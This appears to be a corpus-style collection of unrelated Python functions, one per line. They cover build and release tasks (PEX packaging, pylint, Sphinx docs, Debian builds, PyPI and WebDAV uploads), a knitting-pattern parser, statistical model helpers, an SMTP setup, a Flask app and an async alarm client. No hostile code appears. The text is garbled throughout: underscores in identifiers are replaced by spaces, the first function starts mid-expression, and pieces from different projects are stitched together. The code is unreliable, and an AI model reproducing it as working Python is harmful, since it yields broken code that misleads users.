( ) if not k . startswith ( 'py' ) } env id = [ ] for k , v in sorted ( envs . items ( ) ) : env id . append ( k ) env id . extend ( v ) env id = '-' . join ( env id ) else : env id = 'py2.py3-none-any' new pex file = pex file . replace ( '.pex' , '-{}.pex' . format ( env id ) ) notify . info ( "Renamed PEX to '{}'" . format ( os . path . basename ( new pex file ) ) ) os . rename ( pex file , new pex file ) pex file = new pex file pex files . append ( pex file ) if not pex files : notify . warning ( "No entry points found in project configuration!" ) else : if pyrun : if any ( pyrun . startswith ( i ) for i in ( 'http://' , 'https://' , 'file://' ) ) : pyrun url = pyrun else : pyrun cfg = dict ( ctx . rituals . pyrun ) pyrun cfg . update ( parse qsl ( pyrun . replace ( os . pathsep , '&' ) ) ) pyrun url = ( pyrun cfg [ 'base url' ] + '/' + pyrun cfg [ 'archive' ] ) . format ( * * pyrun cfg ) notify . info ( "Getting Py Run from '{}'..." . format ( pyrun url ) ) with url as file ( pyrun url , ext = 'tgz' ) as pyrun tarball : pyrun tar = tarfile . Tar File . gzopen ( pyrun tarball ) for pex file in pex files [ : ] : pyrun exe = pyrun tar . extractfile ( './bin/pyrun' ) with open ( pex file , 'rb' ) as pex handle : pyrun pex file = '{}{}-installer.sh' . format ( pex file [ : - 4 ] , pyrun url . rsplit ( '/egenix' ) [ - 1 ] [ : - 4 ] ) with open ( pyrun pex file , 'wb' ) as pyrun pex : pyrun pex . write ( INSTALLER BASH . replace ( '00000' , '{:<5d}' . format ( len ( INSTALLER BASH ) + 1 ) ) ) shutil . copyfileobj ( pyrun exe , pyrun pex ) shutil . copyfileobj ( pex handle , pyrun pex ) shutil . copystat ( pex file , pyrun pex file ) notify . info ( "Wrote PEX installer to '{}'" . format ( pretty path ( pyrun pex file ) ) ) pex files . append ( pyrun pex file ) if upload : base url = ctx . rituals . release . upload . base url . rstrip ( '/' ) if not base url : notify . failure ( "No base URL provided for uploading!" ) for pex file in pex files : url = base url + '/' + ctx . rituals . release . upload . path . lstrip ( '/' ) . format ( name = cfg . project . name , version = cfg . project . version , filename = os . path . basename ( pex file ) ) notify . info ( "Uploading to '{}'..." . format ( url ) ) with io . open ( pex file , 'rb' ) as handle : reply = requests . put ( url , data = handle . read ( ) ) if reply . status code in range ( 200 , 300 ) : notify . info ( "{status code} {reason}" . format ( * * vars ( reply ) ) ) else : notify . warning ( "{status code} {reason}" . format ( * * vars ( reply ) ) )
def prep ( ctx , commit = True ) : cfg = config . load ( ) scm = scm provider ( cfg . project root , commit = commit , ctx = ctx ) # Check for uncommitted changes if not scm . workdir is clean ( ) : notify . failure ( "You have uncommitted changes, please commit or stash them!" ) # TODO Check that changelog entry carries the current date # Rewrite 'setup.cfg' setup cfg = cfg . rootjoin ( 'setup.cfg' ) if os . path . exists ( setup cfg ) : with io . open ( setup cfg , encoding = 'utf-8' ) as handle : data = handle . readlines ( ) changed = False for i , line in enumerate ( data ) : if any ( line . startswith ( i ) for i in ( 'tag build' , 'tag date' ) ) : data [ i ] = '#' + data [ i ] changed = True if changed and commit : notify . info ( "Rewriting 'setup.cfg'..." ) with io . open ( setup cfg , 'w' , encoding = 'utf-8' ) as handle : handle . write ( '' . join ( data ) ) scm . add file ( 'setup.cfg' ) elif changed : notify . warning ( "WOULD rewrite 'setup.cfg', but --no-commit was passed" ) else : notify . warning ( "Cannot rewrite 'setup.cfg', none found!" ) # Update metadata and command stubs ctx . run ( 'python setup.py -q develop -U' ) # Build a clean dist and check version number version = capture ( 'python setup.py --version' ) ctx . run ( 'invoke clean --all build --docs release.dist' ) for distfile in os . listdir ( 'dist' ) : trailer = distfile . split ( '-' + version ) [ 1 ] trailer , = os . path . splitext ( trailer ) if trailer and trailer [ 0 ] not in '.-' : notify . failure ( "The version found in 'dist' seems to be" " a pre-release one! [{}{}]" . format ( version , trailer ) ) # Commit changes and tag the release scm . commit ( ctx . rituals . release . commit . message . format ( version = version ) ) scm . tag ( ctx . rituals . release . tag . name . format ( version = version ) , ctx . rituals . release . tag . message . format ( version = version ) )
def pylint ( ctx , skip tests = False , skip root = False , reports = False ) : cfg = config . load ( ) add dir2pypath ( cfg . project root ) if not os . path . exists ( cfg . testjoin ( ' init .py' ) ) : add dir2pypath ( cfg . testjoin ( ) ) namelist = set ( ) for package in cfg . project . get ( 'packages' , [ ] ) : if '.' not in package : namelist . add ( cfg . srcjoin ( package ) ) for module in cfg . project . get ( 'py modules' , [ ] ) : namelist . add ( module + '.py' ) if not skip tests : test py = antglob . File Set ( cfg . testdir , '**/*.py' ) test py = [ cfg . testjoin ( i ) for i in test py ] if test py : namelist |= set ( test py ) if not skip root : root py = antglob . File Set ( '.' , '*.py' ) if root py : namelist |= set ( root py ) namelist = set ( [ i [ len ( os . getcwd ( ) ) + 1 : ] if i . startswith ( os . getcwd ( ) + os . sep ) else i for i in namelist ] ) cmd = 'pylint' cmd += ' "{}"' . format ( '" "' . join ( sorted ( namelist ) ) ) cmd += ' --reports={0}' . format ( 'y' if reports else 'n' ) for cfgfile in ( '.pylintrc' , 'pylint.rc' , 'pylint.cfg' , 'project.d/pylint.cfg' ) : if os . path . exists ( cfgfile ) : cmd += ' --rcfile={0}' . format ( cfgfile ) break try : shell . run ( cmd , report error = False , runner = ctx . run ) notify . info ( "OK - No problems found by pylint." ) except exceptions . Failure as exc : # Check bit flags within pylint return code if exc . result . return code & 32 : # Usage error (internal error in this code) notify . error ( "Usage error, bad arguments in {}?!" . format ( repr ( cmd ) ) ) raise else : bits = { 1 : "fatal" , 2 : "error" , 4 : "warning" , 8 : "refactor" , 16 : "convention" , } notify . warning ( "Some messages of type {} issued by pylint." . format ( ", " . join ( [ text for bit , text in bits . items ( ) if exc . result . return code & bit ] ) ) ) if exc . result . return code & 3 : notify . error ( "Exiting due to fatal / error message." ) raise
def tag ( self , label , message = None ) : options = ' -m "{}" -a' . format ( message ) if message else '' self . run elective ( 'git tag{} "{}"' . format ( options , label ) )
def description ( dummy ctx , markdown = False ) : cfg = config . load ( ) markup = 'md' if markdown else 'html' description file = cfg . rootjoin ( "build/project.{}" . format ( markup ) ) notify . banner ( "Creating {} file for Jenkins..." . format ( description file ) ) long description = cfg . project . long description long description = long description . replace ( '\n\n' , '</p>\n<p>' ) long description = re . sub ( r'(\W)``([^`]+)``(\W)' , r'\1<tt>\2</tt>\3' , long description ) text = DESCRIPTION TEMPLATES [ markup ] . format ( keywords = ', ' . join ( cfg . project . keywords ) , classifiers = '\n' . join ( cfg . project . classifiers ) , classifiers indented = '    ' + '\n    ' . join ( cfg . project . classifiers ) , packages = ', ' . join ( cfg . project . packages ) , long description html = '<p>{}</p>' . format ( long description ) , ##data='\n'.join(["%s=%r" % i for i in cfg.project.iteritems()]), * * cfg ) with io . open ( description file , 'w' , encoding = 'utf-8' ) as handle : handle . write ( text )
def capture ( cmd , * * kw ) : kw = kw . copy ( ) kw [ 'hide' ] = 'out' if not kw . get ( 'echo' , False ) : kw [ 'echo' ] = False ignore failures = kw . pop ( 'ignore failures' , False ) try : return invoke run ( cmd , * * kw ) . stdout . strip ( ) except exceptions . Failure as exc : if not ignore failures : notify . error ( "Command `{}` failed with RC={}!" . format ( cmd , exc . result . return code , ) ) raise
def run ( cmd , * * kw ) : kw = kw . copy ( ) kw . setdefault ( 'warn' , False ) # make extra sure errors don't get silenced report error = kw . pop ( 'report error' , True ) runner = kw . pop ( 'runner' , invoke run ) try : return runner ( cmd , * * kw ) except exceptions . Failure as exc : sys . stdout . flush ( ) sys . stderr . flush ( ) if report error : notify . error ( "Command `{}` failed with RC={}!" . format ( cmd , exc . result . return code , ) ) raise finally : sys . stdout . flush ( ) sys . stderr . flush ( )
def provider ( workdir , commit = True , * * kwargs ) : return SCM PROVIDER [ auto detect ( workdir ) ] ( workdir , commit = commit , * * kwargs )
def fail ( message , exitcode = 1 ) : sys . stderr . write ( 'ERROR: {}\n' . format ( message ) ) sys . stderr . flush ( ) sys . exit ( exitcode )
def get pypi auth ( configfile = '~/.pypirc' ) : pypi cfg = Config Parser ( ) if pypi cfg . read ( os . path . expanduser ( configfile ) ) : try : user = pypi cfg . get ( 'pypi' , 'username' ) pwd = pypi cfg . get ( 'pypi' , 'password' ) return user , pwd except Config Error : notify . warning ( "No Py PI credentials in '{}'," " will fall back to '~/.netrc'..." . format ( configfile ) ) return None
def sphinx ( ctx , browse = False , clean = False , watchdog = False , kill = False , status = False , opts = '' ) : cfg = config . load ( ) if kill or status : if not watchdogctl ( ctx , kill = kill ) : notify . info ( "No process bound to port {}" . format ( ctx . rituals . docs . watchdog . port ) ) return if clean : ctx . run ( "invoke clean --docs" ) # Convert markdown files, if applicable for basename in ( 'README' , 'CONTRIBUTING' ) : markdown = cfg . rootjoin ( basename + '.md' ) if os . path . exists ( markdown ) : try : import pypandoc except Import Error as exc : notify . warning ( "Can't import 'pandoc' ({})" . format ( exc ) ) break else : pypandoc . convert ( markdown , 'rst' , outputfile = os . path . join ( ctx . rituals . docs . sources , basename + '.rst' ) ) # LICENSE file if os . path . exists ( 'LICENSE' ) : with io . open ( 'LICENSE' , 'r' ) as inp : license text = inp . read ( ) try : , copyright text = cfg . project [ 'long description' ] . split ( 'Copyright' , 1 ) except ( Key Error , Value Error ) : copyright text = cfg . project . get ( 'license' , 'N/A' ) with io . open ( os . path . join ( ctx . rituals . docs . sources , 'LICENSE.rst' ) , 'w' ) as out : out . write ( 'Software License\n' '================\n' '\n' '    Copyright {}\n' '\n' 'Full License Text\n' '-----------------\n' '\n' '::\n' '\n' . format ( copyright text ) ) license text = textwrap . dedent ( license text ) license text = '\n    ' . join ( license text . splitlines ( ) ) out . write ( '    {}\n' . format ( license text ) ) # Build API docs if cfg . project . get ( 'packages' ) and str ( ctx . rituals . docs . apidoc ) . lower ( ) [ : 1 ] in 't1y' : cmd = [ 'sphinx-apidoc' , '-o' , 'api' , '-f' , '-M' ] for package in cfg . project . packages : if '.' not in package : cmd . append ( cfg . srcjoin ( package ) ) with pushd ( ctx . rituals . docs . sources ) : ctx . run ( ' ' . join ( cmd ) ) # Auto build? cmd = [ 'sphinx-build' , '-b' , 'html' ] if opts : cmd . append ( opts ) cmd . extend ( [ '.' , ctx . rituals . docs . build ] ) index url = index file = os . path . join ( ctx . rituals . docs . sources , ctx . rituals . docs . build , 'index.html' ) if watchdog : watchdogctl ( ctx , kill = True ) cmd [ 0 : 1 ] = [ 'nohup' , 'sphinx-autobuild' ] cmd . extend ( [ '-H' , ctx . rituals . docs . watchdog . host , '-p' , '{}' . format ( ctx . rituals . docs . watchdog . port ) , "-i'{}'" . format ( '*~' ) , "-i'{}'" . format ( '.*' ) , "-i'{}'" . format ( '*.log' ) , ">watchdog.log" , "2>&1" , "&" , ] ) index url = "http://{}:{}/" . format ( ctx . rituals . docs . watchdog . host , ctx . rituals . docs . watchdog . port ) # Build docs notify . info ( "Starting Sphinx {}build..." . format ( 'auto' if watchdog else '' ) ) with pushd ( ctx . rituals . docs . sources ) : ctx . run ( ' ' . join ( cmd ) , pty = not watchdog ) # Wait for watchdog to bind to listening port if watchdog : def activity ( what = None , i = None ) : "Helper" if i is None : sys . stdout . write ( what + '\n' ) else : sys . stdout . write ( ' {}  Waiting for {}\r' . format ( r'\|/-' [ i % 4 ] , what or 'something' ) ) sys . stdout . flush ( ) for i in range ( 60 ) : activity ( 'server start' , i ) if watchdogctl ( ctx ) : activity ( 'OK' ) break time . sleep ( 1 ) else : activity ( 'ERR' ) # trigger first build if os . path . exists ( os . path . join ( ctx . rituals . docs . sources , 'index.rst' ) ) : os . utime ( os . path . join ( ctx . rituals . docs . sources , 'index.rst' ) , None ) for i in range ( 60 ) : activity ( 'HTML index file' , i ) if os . path . exists ( index file ) : activity ( 'OK' ) break time . sleep ( 1 ) else : activity ( 'ERR' ) # Open in browser? if browse : time . sleep ( 1 ) webbrowser . open new tab ( index url )
def confluence ( ctx , no publish = False , clean = False , opts = '' ) : cfg = config . load ( ) if clean : ctx . run ( "invoke clean --docs" ) cmd = [ 'sphinx-build' , '-b' , 'confluence' ] cmd . extend ( [ '-E' , '-a' ] ) # force a full rebuild if opts : cmd . append ( opts ) cmd . extend ( [ '.' , ctx . rituals . docs . build + ' cf' ] ) if no publish : cmd . extend ( [ '-Dconfluence publish=False' ] ) # Build docs notify . info ( "Starting Sphinx build..." ) with pushd ( ctx . rituals . docs . sources ) : ctx . run ( ' ' . join ( cmd ) , pty = True )
def zipped ( self , docs base ) : with pushd ( docs base ) : with tempfile . Named Temporary File ( prefix = 'pythonhosted-' , delete = False ) as ziphandle : pass zip name = shutil . make archive ( ziphandle . name , 'zip' ) notify . info ( "Uploading {:.1f} Mi B from '{}' to '{}'..." . format ( os . path . getsize ( zip name ) / 1024.0 , zip name , self . target ) ) with io . open ( zip name , 'rb' ) as zipread : try : yield zipread finally : os . remove ( ziphandle . name ) os . remove ( ziphandle . name + '.zip' )
def to pypi ( self , docs base , release ) : url = None with self . zipped ( docs base ) as handle : reply = requests . post ( self . params [ 'url' ] , auth = get pypi auth ( ) , allow redirects = False , files = dict ( content = ( self . cfg . project . name + '.zip' , handle , 'application/zip' ) ) , data = { ':action' : 'doc upload' , 'name' : self . cfg . project . name } ) if reply . status code in range ( 200 , 300 ) : notify . info ( "{status code} {reason}" . format ( * * vars ( reply ) ) ) elif reply . status code == 301 : url = reply . headers [ 'location' ] else : data = self . cfg . copy ( ) data . update ( self . params ) data . update ( vars ( reply ) ) notify . error ( "{status code} {reason} for POST to {url}" . format ( * * data ) ) return url
def to webdav ( self , docs base , release ) : try : git path = subprocess . check output ( 'git remote get-url origin 2>/dev/null' , shell = True ) except subprocess . Called Process Error : git path = '' else : git path = git path . decode ( 'ascii' ) . strip ( ) git path = git path . replace ( 'http://' , '' ) . replace ( 'https://' , '' ) . replace ( 'ssh://' , '' ) git path = re . search ( r'[^:/]+?[:/](.+)' , git path ) git path = git path . group ( 1 ) . replace ( '.git' , '' ) if git path else '' url = None with self . zipped ( docs base ) as handle : url ns = dict ( name = self . cfg . project . name , version = release , git path = git path ) reply = requests . put ( self . params [ 'url' ] . format ( * * url ns ) , data = handle . read ( ) , headers = { 'Accept' : 'application/json' } ) if reply . status code in range ( 200 , 300 ) : notify . info ( "{status code} {reason}" . format ( * * vars ( reply ) ) ) try : data = reply . json ( ) except Value Error as exc : notify . warning ( "Didn't get a JSON response! ({})" . format ( exc ) ) else : if 'download Uri' in data : # Artifactory url = data [ 'download Uri' ] + '!/index.html' elif reply . status code == 301 : url = reply . headers [ 'location' ] else : data = self . cfg . copy ( ) data . update ( self . params ) data . update ( vars ( reply ) ) notify . error ( "{status code} {reason} for PUT to {url}" . format ( * * data ) ) if not url : notify . warning ( "Couldn't get URL from upload response!" ) return url
def upload ( self , docs base , release ) : return getattr ( self , ' to ' + self . target ) ( docs base , release )
def add dir2pypath ( path ) : py path = os . environ . get ( 'PYTHONPATH' , '' ) if path not in py path . split ( os . pathsep ) : py path = '' . join ( [ path , os . pathsep if py path else '' , py path ] ) os . environ [ 'PYTHONPATH' ] = py path
def run ( self , cmd , * args , * * kwargs ) : runner = self . ctx . run if self . ctx else None return run ( cmd , runner = runner , * args , * * kwargs )
def run elective ( self , cmd , * args , * * kwargs ) : if self . commit : return self . run ( cmd , * args , * * kwargs ) else : notify . warning ( "WOULD RUN: {}" . format ( cmd ) ) kwargs = kwargs . copy ( ) kwargs [ 'echo' ] = False return self . run ( 'true' , * args , * * kwargs )
def info ( msg ) : flush ( ) sys . stdout . write ( msg + '\n' ) sys . stdout . flush ( )
def warning ( msg ) : flush ( ) sys . stderr . write ( "\033[1;7;33;40m WARNING: {}\033[0m\n" . format ( msg ) ) sys . stderr . flush ( )
def error ( msg ) : flush ( ) sys . stderr . write ( "\033[1;37;41m ERROR: {}\033[0m\n" . format ( msg ) ) sys . stderr . flush ( )
def get devpi url ( ctx ) : cmd = 'devpi use --urls' lines = ctx . run ( cmd , hide = 'out' , echo = False ) . stdout . splitlines ( ) for line in lines : try : line , base url = line . split ( ':' , 1 ) except Value Error : notify . warning ( 'Ignoring "{}"!' . format ( line ) ) else : if line . split ( ) [ - 1 ] . strip ( ) == 'simpleindex' : return base url . split ( '\x1b' ) [ 0 ] . strip ( ) . rstrip ( '/' ) raise Lookup Error ( "Cannot find simpleindex URL in '{}' output:\n    {}" . format ( cmd , '\n    ' . join ( lines ) , ) )
def get project root ( ) : try : tasks py = sys . modules [ 'tasks' ] except Key Error : return None else : return os . path . abspath ( os . path . dirname ( tasks py . file ) )
def glob2re ( part ) : return "[^/]*" . join ( re . escape ( bit ) . replace ( r'\[\^' , '[^' ) . replace ( r'\[' , '[' ) . replace ( r'\]' , ']' ) for bit in part . split ( "*" ) )
def parse glob ( pattern ) : if not pattern : return bits = pattern . split ( "/" ) dirs , filename = bits [ : - 1 ] , bits [ - 1 ] for dirname in dirs : if dirname == "**" : yield "(|.+/)" else : yield glob2re ( dirname ) + "/" yield glob2re ( filename )
def compile glob ( spec ) : parsed = "" . join ( parse glob ( spec ) ) regex = "^{0}$" . format ( parsed ) return re . compile ( regex )
def included ( self , path , is dir = False ) : inclusive = None for pattern in self . patterns : if pattern . is dir == is dir and pattern . matches ( path ) : inclusive = pattern . inclusive #print('+++' if inclusive else '---', path, pattern) return inclusive
def build ( ctx , dput = '' , opts = '' ) : # Get package metadata with io . open ( 'debian/changelog' , encoding = 'utf-8' ) as changes : metadata = re . match ( r'^([^ ]+) \(([^)]+)\) ([^;]+); urgency=(.+)$' , changes . readline ( ) . rstrip ( ) ) if not metadata : notify . failure ( 'Badly formatted top entry in changelog' ) name , version , , = metadata . groups ( ) # Build package ctx . run ( 'dpkg-buildpackage {} {}' . format ( ctx . rituals . deb . build . opts , opts ) ) # Move created artifacts into "dist" if not os . path . exists ( 'dist' ) : os . makedirs ( 'dist' ) artifact pattern = '{}?{}*' . format ( name , re . sub ( r'[^- .a-z A-Z0-9]' , '?' , version ) ) changes files = [ ] for debfile in glob . glob ( '../' + artifact pattern ) : shutil . move ( debfile , 'dist' ) if debfile . endswith ( '.changes' ) : changes files . append ( os . path . join ( 'dist' , os . path . basename ( debfile ) ) ) ctx . run ( 'ls -l dist/{}' . format ( artifact pattern ) ) if dput : ctx . run ( 'dput {} {}' . format ( dput , ' ' . join ( changes files ) ) )
def clean ( dummy ctx , docs = False , backups = False , bytecode = False , dist = False , # pylint: disable=redefined-outer-name all = False , venv = False , tox = False , extra = '' ) : # pylint: disable=redefined-builtin cfg = config . load ( ) notify . banner ( "Cleaning up project files" ) # Add patterns based on given parameters venv dirs = [ 'bin' , 'include' , 'lib' , 'share' , 'local' , '.venv' ] patterns = [ 'build/' , 'pip-selfcheck.json' ] excludes = [ '.git/' , '.hg/' , '.svn/' , 'debian/*/' ] if docs or all : patterns . extend ( [ 'docs/ build/' , 'doc/ build/' ] ) if dist or all : patterns . append ( 'dist/' ) if backups or all : patterns . extend ( [ '**/*~' ] ) if bytecode or all : patterns . extend ( [ '**/*.py[co]' , '**/ pycache /' , '*.egg-info/' , cfg . srcjoin ( '*.egg-info/' ) [ len ( cfg . project root ) + 1 : ] , ] ) if venv : patterns . extend ( [ i + '/' for i in venv dirs ] ) if tox : patterns . append ( '.tox/' ) else : excludes . append ( '.tox/' ) if extra : patterns . extend ( shlex . split ( extra ) ) # Build fileset patterns = [ antglob . includes ( i ) for i in patterns ] + [ antglob . excludes ( i ) for i in excludes ] if not venv : # Do not scan venv dirs when not cleaning them patterns . extend ( [ antglob . excludes ( i + '/' ) for i in venv dirs ] ) fileset = antglob . File Set ( cfg . project root , patterns ) # Iterate over matches and remove them for name in fileset : notify . info ( 'rm {0}' . format ( name ) ) if name . endswith ( '/' ) : shutil . rmtree ( os . path . join ( cfg . project root , name ) ) else : os . unlink ( os . path . join ( cfg . project root , name ) )
def build ( ctx , docs = False ) : cfg = config . load ( ) ctx . run ( "python setup.py build" ) if docs : for doc path in ( 'docs' , 'doc' ) : if os . path . exists ( cfg . rootjoin ( doc path , 'conf.py' ) ) : break else : doc path = None if doc path : ctx . run ( "invoke docs" ) else : notify . warning ( "Cannot find either a 'docs' or 'doc' Sphinx directory!" )
def freeze ( ctx , local = False ) : cmd = 'pip --disable-pip-version-check freeze{}' . format ( ' --local' if local else '' ) frozen = ctx . run ( cmd , hide = 'out' ) . stdout . replace ( '\x1b' , '#' ) with io . open ( 'frozen-requirements.txt' , 'w' , encoding = 'ascii' ) as out : out . write ( "# Requirements frozen by 'pip freeze' on {}\n" . format ( isodate ( ) ) ) out . write ( frozen ) notify . info ( "Frozen {} requirements." . format ( len ( frozen . splitlines ( ) ) , ) )
def isodate ( datestamp = None , microseconds = False ) : datestamp = datestamp or datetime . datetime . now ( ) if not microseconds : usecs = datetime . timedelta ( microseconds = datestamp . microsecond ) datestamp = datestamp - usecs return datestamp . isoformat ( b' ' if PY2 else u' ' )
def get registered executable ( exe name ) : registered = None if sys . platform . startswith ( 'win' ) : if os . path . splitext ( exe name ) [ 1 ] . lower ( ) != '.exe' : exe name += '.exe' import winreg # pylint: disable=import-error try : key = "SOFTWARE\\Microsoft\\Windows\\Current Version\\App Paths\\" + exe name value = winreg . Query Value ( winreg . HKEY LOCAL MACHINE , key ) registered = ( value , "from HKLM\\" + key ) except winreg . error : pass if registered and not os . path . exists ( registered [ 0 ] ) : registered = None return registered
def can connect to ( self , other ) : assert other . is mesh ( ) disconnected = not other . is connected ( ) and not self . is connected ( ) types differ = self . is consumed mesh ( ) != other . is consumed mesh ( ) return disconnected and types differ
def file ( self , file ) : if not self . text is expected : file = Bytes Wrapper ( file , self . encoding ) self . dump to file ( file )
def binary file ( self , file ) : if self . text is expected : file = Text Wrapper ( file , self . encoding ) self . dump to file ( file )
def path ( self , path ) : mode , encoding = self . mode and encoding for open ( ) with open ( path , mode , encoding = encoding ) as file : self . dump to file ( file )
def set pixel and convert color ( self , x , y , color ) : if color is None : return color = self . convert color to rrggbb ( color ) self . set pixel ( x , y , color )
def instructions changed ( self , change ) : if change . adds ( ) : for index , instruction in change . items ( ) : if isinstance ( instruction , dict ) : in row = self . parser . instruction in row ( self , instruction ) self . instructions [ index ] = in row else : instruction . transfer to row ( self )
def dump knitting pattern ( self , file ) : knitting pattern set = self . on dump ( ) knitting pattern = knitting pattern set . patterns . at ( 0 ) layout = Grid Layout ( knitting pattern ) builder = AYABPNG Builder ( * layout . bounding box ) builder . set colors in grid ( layout . walk instructions ( ) ) builder . write to file ( file )
def start ( self ) : self . instruction library = self . spec . new default instructions ( ) self . as instruction = self . instruction library . as instruction self . id cache = { } self . pattern set = None self . inheritance todos = [ ] self . instruction todos = [ ]
def finish inheritance ( self ) : while self . inheritance todos : prototype , parent id = self . inheritance todos . pop ( ) parent = self . id cache [ parent id ] prototype . inherit from ( parent )
def finish instructions ( self ) : while self . instruction todos : row = self . instruction todos . pop ( ) instructions = row . get ( INSTRUCTIONS , [ ] ) row . instructions . extend ( instructions )
def fill pattern collection ( self , pattern collection , values ) : pattern = values . get ( PATTERNS , [ ] ) for pattern to parse in pattern : parsed pattern = self . pattern ( pattern to parse ) pattern collection . append ( parsed pattern )
def row ( self , values ) : row id = self . to id ( values [ ID ] ) row = self . spec . new row ( row id , values , self ) if SAME AS in values : self . delay inheritance ( row , self . to id ( values [ SAME AS ] ) ) self . delay instructions ( row ) self . id cache [ row id ] = row return row
def pattern ( self , base ) : rows = self . rows ( base . get ( ROWS , [ ] ) ) self . finish inheritance ( ) self . finish instructions ( ) self . connect rows ( base . get ( CONNECTIONS , [ ] ) ) id = self . to id ( base [ ID ] ) name = base [ NAME ] return self . new pattern ( id , name , rows )
def rows ( self , spec ) : rows = self . new row collection ( ) for row in spec : rows . append ( self . row ( row ) ) return rows
def connect rows ( self , connections ) : for connection in connections : from row id = self . to id ( connection [ FROM ] [ ID ] ) from row = self . id cache [ from row id ] from row start index = connection [ FROM ] . get ( START , DEFAULT START ) from row number of possible meshes = from row . number of produced meshes - from row start index to row id = self . to id ( connection [ TO ] [ ID ] ) to row = self . id cache [ to row id ] to row start index = connection [ TO ] . get ( START , DEFAULT START ) to row number of possible meshes = to row . number of consumed meshes - to row start index meshes = min ( from row number of possible meshes , to row number of possible meshes ) # TODO: test all kinds of connections number of meshes = connection . get ( MESHES , meshes ) from row stop index = from row start index + number of meshes to row stop index = to row start index + number of meshes assert 0 <= from row start index <= from row stop index produced meshes = from row . produced meshes [ from row start index : from row stop index ] assert 0 <= to row start index <= to row stop index consumed meshes = to row . consumed meshes [ to row start index : to row stop index ] assert len ( produced meshes ) == len ( consumed meshes ) mesh pairs = zip ( produced meshes , consumed meshes ) for produced mesh , consumed mesh in mesh pairs : produced mesh . connect to ( consumed mesh )
def create pattern set ( self , pattern , values ) : type = self . get type ( values ) version = self . get version ( values ) comment = values . get ( COMMENT ) self . pattern set = self . spec . new pattern set ( type , version , pattern , self , comment )
def write ( self , bytes ) : string = bytes . decode ( self . encoding ) self . file . write ( string )
def write ( self , string ) : bytes = string . encode ( self . encoding ) self . file . write ( bytes )
def width ( self ) : layout = self . instruction . get ( GRID LAYOUT ) if layout is not None : width = layout . get ( WIDTH ) if width is not None : return width return self . instruction . number of consumed meshes
def step ( self , row , position , passed ) : if row in passed or not self . row should be placed ( row , position ) : return self . place row ( row , position ) passed = [ row ] + passed # print("{}{} at\t{} {}".format("  " * len(passed), row, position, #                               passed)) for i , produced mesh in enumerate ( row . produced meshes ) : self . expand produced mesh ( produced mesh , i , position , passed ) for i , consumed mesh in enumerate ( row . consumed meshes ) : self . expand consumed mesh ( consumed mesh , i , position , passed )
def expand consumed mesh ( self , mesh , mesh index , row position , passed ) : if not mesh . is produced ( ) : return row = mesh . producing row position = Point ( row position . x + mesh . index in producing row - mesh index , row position . y - INSTRUCTION HEIGHT ) self . expand ( row , position , passed )
def expand produced mesh ( self , mesh , mesh index , row position , passed ) : if not mesh . is consumed ( ) : return row = mesh . consuming row position = Point ( row position . x - mesh . index in consuming row + mesh index , row position . y + INSTRUCTION HEIGHT ) self . expand ( row , position , passed )
def place row ( self , row , position ) : self . rows in grid [ row ] = Row In Grid ( row , position )
def walk ( self ) : while self . todo : args = self . todo . pop ( 0 ) self . step ( * args )
def instruction in grid ( self , instruction ) : row position = self . rows in grid [ instruction . row ] . xy x = instruction . index of first consumed mesh in row position = Point ( row position . x + x , row position . y ) return Instruction In Grid ( instruction , position )
def dump to file ( self , file ) : xmltodict . unparse ( self . object ( ) , file , pretty = True )
def rsolve ( A , y ) : from numpy sugar . linalg import rsolve as rsolve try : beta = rsolve ( A , y ) except Lin Alg Error : msg = "Could not converge to solve Ax=y." msg += " Setting x to zero." warnings . warn ( msg , Runtime Warning ) beta = zeros ( A . shape [ 0 ] ) return beta
def B ( self ) : return unvec ( self . vec B . value , ( self . X . shape [ 1 ] , self . A . shape [ 0 ] ) )
def posteriori covariance ( self ) : K = GLMM . covariance ( self ) tau = self . ep . posterior . tau return pinv ( pinv ( K ) + diag ( 1 / tau ) )
def economic qs zeros ( n ) : Q0 = empty ( ( n , 0 ) ) Q1 = eye ( n ) S0 = empty ( 0 ) return ( ( Q0 , Q1 ) , S0 )
def value ( self ) : if not self . fix [ "beta" ] : self . update beta ( ) if not self . fix [ "scale" ] : self . update scale ( ) return self . lml ( )
def delta ( self ) : v = float ( self . logistic . value ) if v > 0.0 : v = 1 / ( 1 + exp ( - v ) ) else : v = exp ( v ) v = v / ( v + 1.0 ) return min ( max ( v , epsilon . tiny ) , 1 - epsilon . tiny )
def df ( self ) : if not self . restricted : return self . nsamples return self . nsamples - self . X [ "t X" ] . shape [ 1 ]
def setup smtp factory ( * * settings ) : return Custom SMTP ( host = settings . get ( 'mail.host' , 'localhost' ) , port = int ( settings . get ( 'mail.port' , 25 ) ) , user = settings . get ( 'mail.user' ) , password = settings . get ( 'mail.password' ) , timeout = float ( settings . get ( 'mail.timeout' , 60 ) ) , )
def begin ( self ) : self . connect ( self . host , self . port ) if self . user : self . starttls ( ) self . login ( self . user , self . password )
def create application ( connection : Optional [ str ] = None ) -> Flask : app = Flask ( name ) flask bootstrap . Bootstrap ( app ) Admin ( app ) connection = connection or DEFAULT CACHE CONNECTION engine , session = build engine session ( connection ) for name , add admin in add admins . items ( ) : url = '/{}' . format ( name ) add admin ( app , session , url = url , endpoint = name , name = name ) log . debug ( 'added %s - %s to %s' , name , add admin , url ) app . register blueprint ( ui ) return app
def upload backend ( index = 'dev' , user = None ) : get vars ( ) use devpi ( index = index ) with fab . lcd ( '../application' ) : fab . local ( 'make upload' )
async def update ( self ) -> None : LOGGER . debug ( "Requesting state update from server (S00, S14)" ) await asyncio . gather ( # List unsealed Zones self . send command ( 'S00' ) , # Arming status update self . send command ( 'S14' ) , )
async def update loop ( self ) -> None : await asyncio . sleep ( self . update interval ) while not self . closed : await self . update ( ) await asyncio . sleep ( self . update interval )
def iterate namespace models ( self , * * kwargs ) -> Iterable : return tqdm ( self . get query ( self . namespace model ) , total = self . count model ( self . namespace model ) , * * kwargs )
def get default namespace ( self ) -> Optional [ Namespace ] : return self . get query ( Namespace ) . filter ( Namespace . url == self . get namespace url ( ) ) . one or none ( )
def make namespace ( self ) -> Namespace : namespace = Namespace ( name = self . get namespace name ( ) , keyword = self . get namespace keyword ( ) , url = self . get namespace url ( ) , version = str ( time . asctime ( ) ) , ) self . session . add ( namespace ) entries = self . get namespace entries ( namespace ) self . session . add all ( entries ) t = time . time ( ) log . info ( 'committing models' ) self . session . commit ( ) log . info ( 'committed models in %.2f seconds' , time . time ( ) - t ) return namespace
def add namespace to graph ( self , graph : BEL Graph ) -> Namespace : namespace = self . upload bel namespace ( ) graph . namespace url [ namespace . keyword ] = namespace . url # Add this manager as an annotation, too self . add annotation to graph ( graph ) return namespace
